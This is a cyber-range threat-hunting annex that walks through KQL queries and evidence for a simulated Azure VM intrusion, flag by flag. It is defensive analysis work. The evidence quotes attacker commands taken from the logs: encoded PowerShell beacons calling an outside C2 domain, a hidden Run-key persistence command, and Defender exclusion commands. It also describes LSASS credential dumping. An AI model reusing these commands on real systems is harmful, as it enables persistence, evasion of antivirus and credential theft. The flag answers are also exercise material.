# 🔬 Technical Annex — Signals After the Noise (Azure VM Intrusion)
## KQL Queries & Investigation Evidence

> **Incident:** INC-2025-1213-PHTG | **Workspace:** LAW-Cyber-Range  
> **Analyst:** Peter Gergely (T2) | **Window:** 2025-12-13 09:00 → 18:00 UTC  
> **Flags Captured:** 28 of 29 (Q00–Q29)

---

## 📋 Data Sources Queried

| Table | Contents |
|---|---|
| `DeviceProcessEvents` | Process creation and execution events |
| `DeviceRegistryEvents` | Registry read/write/delete events |
| `DeviceFileEvents` | File create/modify/delete events |
| `DeviceNetworkEvents` | Outbound network connections |
| `DeviceEvents` | Raw device events (LSASS access, PowerShell commands, AV reports) |
| `DeviceLogonEvents` | Logon success/failure events |
| `AzureActivity` | Azure control-plane activity log |
| `BehaviorAnalytics` | UEBA / identity behaviour analytics |

---

## 🚩 Q00 — Acceptance

**Finding:** `ready to hunt`

Confirmation phrase from the Cyber Range onboarding. No KQL required.

---

## 🚩 Q01 — The Brute Force Assumption

**Finding:** `credential reuse`

Three queries establish the full picture: disproving brute force, confirming control-plane activity before OS logon, and identifying the Entra identity and its role.

```kql
-- Query 1: Disprove brute force against vmadminusername
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 09:35:00))
| where DeviceName == "azwks-phtg-02"
| where AccountName == "vmadminusername"
| project TimeGenerated, AccountName, RemoteIP, ActionType, LogonType
| sort by TimeGenerated asc
```

**Evidence:** Only two failed network logons (09:27, 09:28) immediately preceded success at 09:31. No spray, no lockout, no high-volume failures against this account. Brute-force alerts in the workspace targeted generic accounts (`root`, `administrator`, `admin`) — never `vmadminusername`.

```kql
-- Query 2: Control-plane activity before OS logon
AzureActivity
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 09:35:00))
| where CallerIpAddress == "173.244.55.131"
| project TimeGenerated, OperationNameValue, Caller, CallerIpAddress, ActivityStatusValue
| sort by TimeGenerated asc
```

**Evidence:** Same IP performed `MICROSOFT.COMPUTE/VIRTUALMACHINES/RESTART/ACTION` at 09:29–09:30 as Entra identity `98eb…@lognpacific.com` — before any OS-level logon at 09:31:12.

```kql
-- Query 3: Identity, role, and reuse pattern
BehaviorAnalytics
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 10:00:00))
| where UserName == "98eb2485ddba6ef3439ed62d7f0274ac9fc34c21a71651b795dd69a1efdd64c3"
| project TimeGenerated, UserName, SourceIPAddress, ActivityType, ActionType, ActivityInsights
| sort by TimeGenerated asc
```

**Evidence:** Identity signed into Azure Portal from 09:02, held Virtual Machine Contributor, wrote VMAccess extension (09:15), restarted VM (09:30). Credential reused across Azure control plane and in-guest OS. Maps to **T1078 – Valid Accounts**.

---

## 🚩 Q02 — Lateral Movement Summary

**Finding:** `vmadminusername, 10.0.0.152, azwks-phtg-01`

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where ActionType == "LogonSuccess"
| where RemoteIP startswith "10."
| where LogonType in ("Network", "RemoteInteractive")
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType
| sort by TimeGenerated asc
```

**Evidence:**

| Time | Account | Source IP | Target | Logon Type |
|---|---|---|---|---|
| 09:48:34 | vmadminusername | 10.0.0.152 | azwks-phtg-01 | Network |
| 09:48:35 | vmadminusername | 10.0.0.152 | azwks-phtg-01 | Network |
| 09:48:40 | vmadminusername | 10.0.0.152 | azwks-phtg-01 | RemoteInteractive |

`10.0.0.152` is the internal IP of `azwks-phtg-02`. Maps to **T1021.001 – Remote Desktop Protocol**.

---

## 🚩 Q03 — Onward Movement Check

**Finding:** `None`

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where RemoteIP == "10.0.0.105"
| where ActionType == "LogonSuccess"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType, ActionType
| sort by TimeGenerated asc
```

**Evidence:** Zero results. `azwks-phtg-01` (10.0.0.105) never appeared as a source IP in any subsequent successful logon. Blast radius confirmed as two hosts only. Negative findings are still findings.

---

## 🚩 Q04 — Orchestrator Script

**Finding:** `C:\Users\vmAdminUsername\Documents\PHTG_.ps1`

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where AccountName == "vmadminusername"
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "-File"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessFileName, FolderPath
| sort by TimeGenerated asc
```

**Evidence:** Earliest match at 10:11:42.552:
```
"powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -File
"C:\Users\vmAdminUsername\Documents\PHTG\_.ps1"
```
Located in the operator's own profile, predates all `task_FLAG-*.ps1` executions (which spawn from `svchost.exe`). This was the operator's hands-on-keyboard launch. Maps to **T1059.001 – PowerShell**.

---

## 🚩 Q05 — Operator Concealment Flags

**Finding:** `-WindowStyle Hidden -ExecutionPolicy Bypass`

Same query as Q04. From the 10:11:42 command line, two parameters override PowerShell defaults:
- `-WindowStyle Hidden` — suppresses the PowerShell window, invisible at console
- `-ExecutionPolicy Bypass` — disables script execution restrictions

A legitimate administrative script run interactively has no need to hide its window or bypass execution policy. Their combined presence is the operator's tell. Maps to **T1564 – Hide Artifacts**.

---

## 🚩 Q06 — Operator Tooling Workspace

**Finding:** `C:\ProgramData\PHTG\HealthCloud`

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where FolderPath startswith "C:\\ProgramData\\PHTG\\HealthCloud"
| extend SubDir = tostring(split(FolderPath, "\\", 4)[0])
| summarize FileCount = count() by SubDir
| sort by FileCount desc
```

**Evidence:** Three subdirectories confirmed: `Cache` (task scripts), `Bin` (utility scripts), `TempCache` (staging). The HealthCloud name is a deliberate masquerade — T1036.005. Operator chose `C:\ProgramData\` to survive profile cleanup and appear as a system-level application.

---

## 🚩 Q07 — Hidden Artifact Count

**Finding:** `Cache (17) and TempCache (2). Cache received the heavier treatment.`

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where FileName =~ "attrib.exe"
| where ProcessCommandLine has_any ("+h", "+s")
| extend TargetPath = extract(@'[+][hs]+\s+"?([^"]+)"?', 1, ProcessCommandLine)
| extend TopDir = tostring(split(TargetPath, "\\", 4)[0])
| summarize Count = count() by TopDir
| sort by Count desc
```

**Evidence:** 20 `attrib +h +s` calls across two directories:
- `Cache` — 17 calls (one per FLAG file)
- `TempCache` — 2 calls (directory itself + `healthcloud.tmp`)
- 1 stray nested subfolder under `TempCache\Diag\` — excluded per hint guidance

Identical pattern on `azwks-phtg-02` confirms the operator applied the same playbook to both hosts. Maps to **T1564.001 – Hidden Files and Directories**.

---

## 🚩 Q08 — LOLBin Detection

**Finding:** `PHTGHealthCloudSvc.exe is a renamed copy of bitsadmin.exe`

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where ProcessVersionInfoOriginalFileName != FileName
| where ProcessVersionInfoOriginalFileName != ""
| where AccountName == "vmadminusername"
    or ProcessCommandLine has_any ("PHTG", "HealthCloud", "ProgramData")
| project TimeGenerated, FileName, ProcessVersionInfoOriginalFileName,
    ProcessCommandLine, InitiatingProcessFileName, AccountName
| sort by TimeGenerated asc
```

**Evidence:**
- `FileName`: `PHTGHealthCloudSvc.exe`
- `ProcessVersionInfoOriginalFileName`: `bitsadmin.exe`
- Command: `PHTGHealthCloudSvc.exe /healthcheck /flag:FLAG-01 /device:azwks-phtg-01 /role:workstation`

All other mismatches in the dataset were legitimate Windows binaries with trivial case differences (`csrss.exe → CSRSS.Exe`, etc.) — none carried campaign markers. Maps to **T1036.005 – Masquerading**.

---

## 🚩 Q09 — Registry Event Volume

**Finding:** `280`

```kql
DeviceRegistryEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName =~ "vmadminusername"
| summarize count()
```

**Evidence:** 280 registry events under `vmadminusername` on `azwks-phtg-01` after the lateral movement timestamp. No end-time cap applied — "after lateral movement" means everything from 09:48:40.453 UTC forward without an artificial boundary. Capping at 18:00 UTC returned an incorrect lower count.

---

## 🚩 Q10 — Persistence Signal Isolation

**Finding:** `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

```kql
DeviceRegistryEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName =~ "vmadminusername"
| summarize count() by RegistryKey
| sort by count_ asc
```

**Evidence:** Among 280 events, sorting ascending surfaces low-count operator keys against high-volume Windows churn. A single campaign-attributed write to `CurrentVersion\Run` stood out — value name `PHTGHealthCloudTray`, pointing to a hidden PowerShell script in the HealthCloud `Bin` directory. Maps to **T1547.001 – Registry Run Keys**.

---

## 🚩 Q11 — Run Key Value Name

**Finding:** `PHTGHealthCloudTray`

```kql
DeviceRegistryEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName =~ "vmadminusername"
| where RegistryKey has "CurrentVersion\\Run"
| where ActionType == "RegistryValueSet"
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:** Four `RegistryValueSet` events on the Run key. Three were `MicrosoftEdgeAutoLaunch` written by `msedge.exe` — legitimate Edge auto-start behavior. The fourth at 10:12:59:
- `RegistryValueName`: `PHTGHealthCloudTray`
- `RegistryValueData`: `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"`
- `InitiatingProcess`: `task_FLAG-05.ps1`

---

## 🚩 Q12 — Run Key Persistence Command

**Finding:** `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"`

Same query as Q11, filtered to `RegistryValueName == "PHTGHealthCloudTray"`.

**Evidence:** Four components of the persistence command:
- `-NoProfile` — skips security-hardened profile scripts
- `-WindowStyle Hidden` — invisible execution
- `-ExecutionPolicy Bypass` — overrides script restrictions
- `-File "...\HealthCloudTray.ps1"` — payload in operator's Bin directory

Three flags disable distinct defensive controls. At every logon Windows executes this automatically. Maps to **T1547.001 + T1059.001**.

---

## 🚩 Q13 — Second Persistence Mechanism

**Finding:** `PHTG HealthCloud.lnk`

```kql
DeviceFileEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where ActionType == "FileCreated"
| where FolderPath has "Startup"
| where FileName endswith ".lnk"
| project TimeGenerated, FileName, FolderPath,
    InitiatingProcessFileName, InitiatingProcessCommandLine
```

**Evidence:** Single match — `PHTG HealthCloud.lnk` dropped in the Windows Startup folder. Provides redundancy alongside the Run key: if one is removed, the other remains. Maps to **T1547.001 – Startup Folder**.

---

## 🚩 Q14 — Third Persistence Mechanism

**Finding:** `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud`

```kql
DeviceRegistryEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName =~ "vmadminusername"
| where RegistryKey startswith "HKEY_LOCAL_MACHINE"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName,
    RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:** Single HKLM key created under `vmadminusername` — the standard Windows mechanism for registering a custom Event Log source. Enables the operator's tooling to write entries to the Application log under the `PHTGHealthCloud` source name, hiding operational telemetry among thousands of legitimate entries. Maps to **T1112 – Modify Registry**.

---

## 🚩 Q15 — Tooling Healthcheck Loop

**Finding:** `22`

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where FileName =~ "PHTGHealthCloudSvc.exe"
| where ProcessCommandLine has "/healthcheck"
| summarize count()
```

**Evidence:** 22 executions of the masqueraded LOLBin on `azwks-phtg-01` post-lateral-movement. Each iteration: `/healthcheck /flag:FLAG-XX /device:azwks-phtg-01 /role:workstation`. Regular intervals confirm a beacon loop — operator heartbeat disguised as a service healthcheck.

---

## 🚩 Q16 — Encoded Beacon Endpoints

**Finding:** `https://status.health-cloud.cc/api/checkin` and `https://status.health-cloud.cc/api/status`

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "-EncodedCommand"
| extend EncodedBlob = extract(@'-EncodedCommand\s+([A-Za-z0-9+/=]+)', 1, ProcessCommandLine)
| extend DecodedCommand = base64_decode_tostring(EncodedBlob)
| project TimeGenerated, ProcessCommandLine, EncodedBlob, DecodedCommand,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:**

Beacon 1 (11:13:43) decoded:
```powershell
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?flag=FLAG-09&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
```

Beacon 2 (11:13:56) decoded:
```powershell
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
```

40+ other `-EncodedCommand` executions were `gc_worker.exe` (Azure Guest Configuration agent) — all legitimate. Maps to **T1027 – Obfuscated Files | T1071.001 – Web Protocols**.

---

## 🚩 Q17 — Two Beacons, Why?

**Finding:** Redundancy + detection evasion through traffic splitting

Two distinct channels operated in parallel:
- **Channel 1:** `PHTGHealthCloudSvc.exe /healthcheck` loop — LOLBin process-based beacon (22 executions)
- **Channel 2:** Encoded PowerShell `Invoke-WebRequest` to `status.health-cloud.cc` — script-based HTTPS beacon

**Operational benefits:**
1. If one channel is blocked or detected, the other maintains operator access independently
2. Traffic split across two mechanistically different streams forces defenders to identify and correlate both independently — each presents a lower volume and narrower signature than a single consolidated beacon

---

## 🚩 Q18 — Deployment Pattern Recognition

**Finding:** Retrieve from C2 → immediately execute locally (stage-then-execute)

```kql
-- Step 1: Outbound retrieval
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-12-13 10:12:15) .. datetime(2025-12-13 10:12:18))
| where DeviceName == "azwks-phtg-01"
| project TimeGenerated, ActionType, RemoteUrl, RemoteIP, RemotePort,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc

-- Step 2: Local execution (one second later)
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 10:12:15) .. datetime(2025-12-13 10:12:18))
| where DeviceName == "azwks-phtg-01"
| project TimeGenerated, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:** Two events fire one second apart — outbound call to `updates.health-cloud.cc` at 10:12:16, then `PHTGHealthCloudSvc.exe` launches at 10:12:17. Pattern repeats across all FLAG task cycles, confirming automated retrieve-then-execute orchestration. Maps to **T1105 → T1059**.

---

## 🚩 Q19 — Operator Outbound Domains

**Finding:** `updates.health-cloud.cc, status.health-cloud.cc`

```kql
DeviceNetworkEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where ActionType == "ConnectionSuccess"
| where InitiatingProcessFileName in~ ("powershell.exe", "PHTGHealthCloudSvc.exe")
| summarize FirstSeen = min(TimeGenerated) by RemoteUrl
| sort by FirstSeen asc
```

**Evidence:** Seven `RemoteUrl` values returned. Two operator domains separated from legitimate traffic by: uncommon `.cc` TLD, shared `health-cloud.cc` parent domain matching the HealthCloud masquerade, and all remaining domains verified as legitimate Microsoft/Azure infrastructure.

- `updates.health-cloud.cc` — tool retrieval (T1105)
- `status.health-cloud.cc` — beacon check-in (T1071.001)

---

## 🚩 Q20 — AMSI Probe

**Finding:** `amsi_probe.ps1` in `C:\ProgramData\PHTG\HealthCloud\Bin`

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "HealthCloud\\Bin"
| where ProcessCommandLine !has "-EncodedCommand"
| project TimeGenerated, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:** Single non-encoded script from the Bin directory — `amsi_probe.ps1`. AMSI (Antimalware Scan Interface) intercepts and scans PowerShell scripts at runtime. Operators probe AMSI status before deploying primary payloads to determine whether scripts will be flagged. If active, they must bypass it first. Standard pre-deployment recon step in offensive tradecraft.

---

## 🚩 Q21 — Lineage Break Pattern

**Finding:** `cmd.exe /c hc_lineage.ps1` and `cmd.exe /c phtg_health_diag_update_FLAG-22.bat`

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 10:48:40))
| where DeviceName == "azwks-phtg-01"
| where AccountName == "vmadminusername"
| where FileName =~ "cmd.exe"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName,
    InitiatingProcessCommandLine, ProcessId, InitiatingProcessId
| sort by TimeGenerated asc
```

**Evidence:** 24 `cmd.exe` invocations in the first hour. 22 were `whoami /all > %TEMP%\whoami_FLAG-XX.txt` — reconnaissance. Two were payload-chaining:

- 11:15:15: `cmd.exe /c powershell.exe ... -File "...\hc_lineage.ps1"`
- 11:16:09: `cmd.exe /c "...\phtg_health_diag_update_FLAG-22.bat"`

**Operational benefit:** Inserting `cmd.exe` as intermediary breaks the process lineage tree. EDR traces parent-child relationships — `cmd.exe` (which fires thousands of times daily) as the parent of the downstream payload obscures the direct link to the operator's orchestrator. Maps to **T1059.003 – Windows Command Shell**.

---

## 🚩 Q22 — Defender Tampering

**Finding:** Path exclusion for `Cache` directory + Process exclusion for `PHTGHealthCloudSvc.exe`

```kql
DeviceEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName in ("azwks-phtg-01", "azwks-phtg-02")
| where ActionType == "PowerShellCommand"
| extend Command = tostring(parse_json(AdditionalFields).Command)
| where Command has "Add-MpPreference"
| project TimeGenerated, DeviceName, Command
| sort by TimeGenerated asc
```

**Evidence:** Three `Add-MpPreference` commands on `azwks-phtg-01`:

1. **Temporary (11:11:42):** `ExclusionPath "C:\Users\vmAdminUsername\Documents\PHTG"` — added before `_.ps1` launch, removed immediately after. No permanent trace.
2. **Persistent (11:12:18):** `ExclusionPath "C:\ProgramData\PHTG\HealthCloud\Cache" -Force` — blinds Defender to all staged task scripts
3. **Persistent (11:14:29):** `ExclusionProcess "C:\ProgramData\PHTG\HealthCloud\PHTGHealthCloudSvc.exe" -Force` — prevents inspection of masqueraded LOLBin

Surgical exclusions leave Defender functional for everything else — much harder to detect than disabling AV entirely. Maps to **T1562.001 – Impair Defenses**.

---

## 🚩 Q23 — Defender Detection Outcome

**Finding:** Detected but did not block — `WasExecutingWhileDetected: false`

```kql
DeviceEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where ActionType == "AntivirusReport"
| where FileName == "PHTG HealthCloud.lnk"
| project TimeGenerated, FileName, AdditionalFields
| sort by TimeGenerated asc
```

**Evidence:** Two `AntivirusReport` events at 11:13:14 and 11:13:16:
- `WasExecutingWhileDetected: false` — found at rest on disk, not caught mid-execution
- `ActionType: AntivirusReport` — informational only, no quarantine or removal

Persistence mechanism remained in Startup folder, fully functional. Common real-world gap: Defender generated telemetry but took no remediation action.

---

## 🚩 Q24 — Temporary Defender Exclusion

**Finding:** `C:\Users\vmAdminUsername\Documents\PHTG` — added then immediately removed

```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-12-13 11:11:00) .. datetime(2025-12-13 11:12:00))
| where DeviceName == "azwks-phtg-01"
| where ActionType == "PowerShellCommand"
| extend Command = tostring(parse_json(AdditionalFields).Command)
| where Command has_any ("Add-MpPreference", "Remove-MpPreference")
| project TimeGenerated, DeviceName, Command
| sort by TimeGenerated asc
```

**Evidence:** Full add-then-remove sequence captured in a single `PowerShellCommand` event at 11:11:42:
```powershell
$ScriptDir = "C:\Users\vmAdminUsername\Documents\PHTG";
Add-MpPreference -ExclusionPath $ScriptDir;
Start-Process -FilePath powershell.exe -ArgumentList "... -File `"$OutFile`"" -Wait;
Remove-MpPreference -ExclusionPath $ScriptDir
```

The `-Wait` flag ensures the exclusion persists for the entire execution duration. Removal fires only after payload completes. No permanent exclusion left behind — minimises forensic footprint while still ensuring unimpeded execution.

---

## 🚩 Q25 — Startup Execution Validation

**Finding:** `2`

```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-12-13 10:12:59)
| where DeviceName == "azwks-phtg-01"
| where ProcessCommandLine has "HealthCloudTray.ps1"
| summarize count()
```

**Evidence:** Two executions of `HealthCloudTray.ps1` recorded after the Run key was written at 10:12:59. Each corresponds to a logon event where Windows processed the HKCU Run key and automatically launched the operator's script. Persistence confirmed functional — the full T1547.001 chain worked as intended.

---

## 🚩 Q26 — Custom Event Log Source Purpose

**Finding:** Enables writing to the Application event log under a legitimate-looking source name — operational telemetry hidden in plain sight

```kql
DeviceRegistryEvents
| where TimeGenerated > datetime(2025-12-13 09:48:40.453)
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName =~ "vmadminusername"
| where RegistryKey startswith "HKEY_LOCAL_MACHINE"
| where RegistryKey has "EventLog"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName,
    RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:** `HKLM\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud` — registers `PHTGHealthCloud` as an authorized Application log source. Application log contains thousands of entries from legitimate sources — operator entries sit alongside them, visually indistinguishable. The HealthCloud masquerade (T1036.005) now extends into the logging infrastructure itself.

---

## 🚩 Q27 — LSASS Access Anomaly

**Finding:** `vmadminusername, powershell.exe`

```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 18:00:00))
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessAccountName !in ("system", "network service", "local service")
| project TimeGenerated, DeviceName, InitiatingProcessFileName,
    InitiatingProcessAccountName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:** 139 total `OpenProcessApiCall` events targeting `lsass.exe`. 134 were system-context (`MsMpEng.exe`, `WmiPrvSE.exe`, `SenseIR.exe`) — baseline. One legitimate user-context event: `Taskmgr.exe` under `vmadminusername` at 16:08 (Task Manager enumerates all processes for display — benign). Four anomalous: `powershell.exe` under `vmadminusername`, via `task_FLAG-13.ps1`, on both hosts. PowerShell has no legitimate reason to access LSASS directly. Maps to **T1003.001 – LSASS Memory**.

---

## 🚩 Q28 — Access Right Escalation

**Finding:** `2047999` (PROCESS_ALL_ACCESS)

```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 18:00:00))
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessAccountName == "vmadminusername"
| where InitiatingProcessFileName =~ "powershell.exe"
| extend DesiredAccess = tostring(parse_json(AdditionalFields).DesiredAccess)
| project TimeGenerated, DeviceName, DesiredAccess, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**Evidence:** Two-step escalation on both hosts, replicated identically:

| Step | DesiredAccess | Decoded | Purpose |
|---|---|---|---|
| 1 | 5136 (0x1410) | PROCESS_QUERY_INFORMATION + VM_READ | Reconnaissance handle — verify access |
| 2 | 2047999 (0x1FFFFF) | PROCESS_ALL_ACCESS | Credential dump handle — read full memory |

Escalation from query to full access within one second reveals intent. A legitimate process querying LSASS metadata stops at the query handle. The one-second escalation to `PROCESS_ALL_ACCESS` is the high-fidelity indicator of credential access.

---

## 🚩 Q29 — Credential Dump Confirmation

**Finding:** `ReadProcessMemoryApiCall`

```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-12-13 11:14:00) .. datetime(2025-12-13 12:00:00))
| where DeviceName == "azwks-phtg-01"
| where ActionType == "ReadProcessMemoryApiCall"
| where FileName =~ "lsass.exe"
| project TimeGenerated, ActionType, FileName, InitiatingProcessFileName,
    InitiatingProcessAccountName, AdditionalFields
| sort by TimeGenerated asc
```

**Evidence:** `ReadProcessMemoryApiCall` event at 12:32:36 targeting `lsass.exe`:
- `TotalBytesCopied: 1520` — forensic confirmation of active memory extraction
- Completes the full credential dumping chain: query handle → full access handle → memory read

`OpenProcessApiCall` alone grants the right to interact — it doesn't read data. `ReadProcessMemoryApiCall` confirms the handle was actively used to extract credential material. This is the definitive confirmation of T1003.001 execution.

---

## 📌 IOC Summary

| Type | Value | Context |
|---|---|---|
| Attacker IP | 173.244.55.131 | Azure Portal sign-in + RDP source |
| Azure Identity | 98eb2485...@lognpacific.com | Entra ID for control-plane operations |
| C2 Domain | updates.health-cloud.cc | Tool retrieval endpoint |
| C2 Domain | status.health-cloud.cc | Beacon check-in (/api/checkin, /api/status) |
| Compromised Account | vmadminusername | Local admin on both VMs |
| Host | azwks-phtg-02 (10.0.0.152) | Primary — initial access |
| Host | azwks-phtg-01 (10.0.0.105) | Secondary — lateral movement target |
| LOLBin | PHTGHealthCloudSvc.exe | Renamed bitsadmin.exe |
| Orchestrator | C:\Users\vmAdminUsername\Documents\PHTG_.ps1 | Operator entry-point script |
| Workspace | C:\ProgramData\PHTG\HealthCloud\ | Root operator tooling directory |
| Run Key | HKCU\...\Run\PHTGHealthCloudTray | Persistence entry |
| Startup Artifact | PHTG HealthCloud.lnk | Startup folder persistence |
| Event Log Source | HKLM\...\EventLog\Application\PHTGHealthCloud | Covert logging channel |
| AMSI Script | C:\ProgramData\PHTG\HealthCloud\Bin\amsi_probe.ps1 | Pre-deployment AMSI recon |
| Access Right | 2047999 (0x1FFFFF) | PROCESS_ALL_ACCESS against LSASS |

---

*Technical Annex — Signals After the Noise | INC-2025-1213-PHTG*  
*Analyst: Peter Gergely | [LinkedIn](https://www.linkedin.com/in/peter-g-03846161/) | [GitHub](https://github.com/petergergely-grc)*
